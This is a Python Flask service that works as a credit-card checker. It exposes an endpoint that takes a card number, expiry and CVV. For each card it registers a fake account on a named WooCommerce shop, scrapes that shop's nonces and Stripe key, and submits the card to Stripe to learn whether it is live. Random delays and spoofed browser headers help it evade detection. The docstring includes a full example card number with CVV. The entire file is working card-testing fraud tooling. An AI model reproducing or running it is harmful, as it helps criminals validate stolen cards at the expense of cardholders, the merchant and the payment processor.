
from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker
import logging

app = Flask(__name__)

# Manual CORS headers add karne ke liye
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

faker = Faker()

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
 
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()
    
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }
    
    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    
    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> tuple:
    """Extract message and success status from response"""
    try:
        response_json = response.json()
        
        # Check if success is in response
        success = response_json.get('success', False)
        
        if 'message' in response_json:
            return success, response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return success, value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return success, response_json["error"]['message']
        
        return success, f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return False, match.group(1)
        
        return False, f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return False, f"An unexpected error occurred during message extraction: {e}"

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid):
    
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    
    logger.info("Starting New Session")
    
    try:
        # Step 1: Initial GET request
        logger.info("1. Performing initial GET request...")
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        logger.info(f"Extracted regester_nouce: {regester_nouce}")
        logger.info(f"Extracted pk: {pk}")
        time.sleep(random.uniform(1.0, 3.0))
        
        # Step 2: POST request to register email
        logger.info("2. Performing POST request to register email...")
        url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_2 = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        data_2 = {
            'email': faker.email(domain="gmail.com"),
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': url_1,
            'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_ag,
            'woocommerce-register-nonce': regester_nouce,
            '_wp_http_referer': '/en/moj-racun/add-payment-method/',
            'register': 'Register',
        }
        
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        logger.info(f"Extracted ajax_nonce: {ajax_nonce}")
        time.sleep(random.uniform(1.0, 3.0))
        
        # Step 3: POST request to Stripe API
        logger.info("3. Performing POST request to Stripe API...")
        url_3 = 'https://api.stripe.com/v1/payment_methods'
        headers_3 = {
            'User-Agent': user_ag,
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=4',
        }
        
        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(100000, 999999)),
            'client_attribution_metadata[client_session_id]': client_element,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_element,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': pk,
            '_stripe_version': '2024-06-20',
        }
        
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        pm = response_3.json()['id']
        logger.info(f"Extracted pm (payment method ID): {pm}")
        time.sleep(random.uniform(1.0, 3.0))
        
        # Step 4: Final POST request
        logger.info("4. Performing final POST request with wc-ajax and pm...")
        url_4 = f'{base_url}/en/'
        headers_4 = {
            'User-Agent': user_ag,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': base_url,
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        # Extract message and status
        success, message = extract_message(response_4)
        
        # Try to get more detailed error if available
        try:
            response_json = response_4.json()
            if not success and 'data' in response_json and 'error' in response_json['data']:
                message = response_json['data']['error'].get('message', message)
        except:
            pass
        
        logger.info(f"Final Result - Success: {success}, Message: {message}")
        
        return success, message
        
    except Exception as e:
        logger.error(f"Process failed: {e}")
        return False, str(e)

@app.route('/strip', methods=['GET'])
def process_card():
    """
    Endpoint to process card payment
    Format: /strip?cc=4097581393841577|06|32|537
    """
    # Get cc parameter
    cc_param = request.args.get('cc', '')
    
    if not cc_param:
        return jsonify({
            "success": False,
            "data": {
                "error": {
                    "message": "Missing cc parameter. Format: ?cc=card_number|exp_month|exp_year|cvv"
                }
            }
        }), 400
    
    # Parse card details (format: number|month|year|cvv)
    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({
                "success": False,
                "data": {
                    "error": {
                        "message": "Invalid format. Use: card_number|exp_month|exp_year|cvv (e.g., 4097581393841577|06|32|537)"
                    }
                }
            }), 400
        
        card_number = parts[0].strip()
        card_month = parts[1].strip()
        card_year = parts[2].strip()
        card_cvv = parts[3].strip()
        
        # Validate card number
        if not card_number.isdigit() or len(card_number) < 15:
            return jsonify({
                "success": False,
                "data": {
                    "error": {
                        "message": "Invalid card number"
                    }
                }
            }), 400
            
        # Validate month
        if not card_month.isdigit() or int(card_month) < 1 or int(card_month) > 12:
            return jsonify({
                "success": False,
                "data": {
                    "error": {
                        "message": "Invalid expiration month (01-12)"
                    }
                }
            }), 400
            
        # Validate year
        if not card_year.isdigit() or len(card_year) != 2:
            return jsonify({
                "success": False,
                "data": {
                    "error": {
                        "message": "Invalid expiration year (2 digits)"
                    }
                }
            }), 400
            
        # Validate CVV
        if not card_cvv.isdigit() or len(card_cvv) < 3:
            return jsonify({
                "success": False,
                "data": {
                    "error": {
                        "message": "Invalid CVV (3-4 digits)"
                    }
                }
            }), 400
            
    except Exception as e:
        return jsonify({
            "success": False,
            "data": {
                "error": {
                    "message": f"Error parsing card details: {str(e)}"
                }
            }
        }), 400
    
    # Generate dynamic values
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    CLIENT_ELEMENT = f'src_{random.randint(1000000000000, 9999999999999)}abcdef'
    GUID = f'guid_{random.randint(1000000000000000000, 9999999999999999999)}'
    MUID = f'muid_{random.randint(1000000000000000000, 9999999999999999999)}'
    SID = f'sid_{random.randint(1000000000000000000, 9999999999999999999)}'
    
    # Process the card
    success, message = run_automated_process(
        card_num=card_number,
        card_cvv=card_cvv,
        card_yy=card_year,
        card_mm=card_month,
        user_ag=USER_AGENT,
        client_element=CLIENT_ELEMENT,
        guid=GUID,
        muid=MUID,
        sid=SID
    )
    
    # Format response as requested
    if success:
        return jsonify({
            "success": True,
            "data": {
                "message": message
            }
        })
    else:
        return jsonify({
            "success": False,
            "data": {
                "error": {
                    "message": message
                }
            }
        })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    # Run on all interfaces, port 5000
    app.run(host='0.0.0.0', port=5000, debug=False)
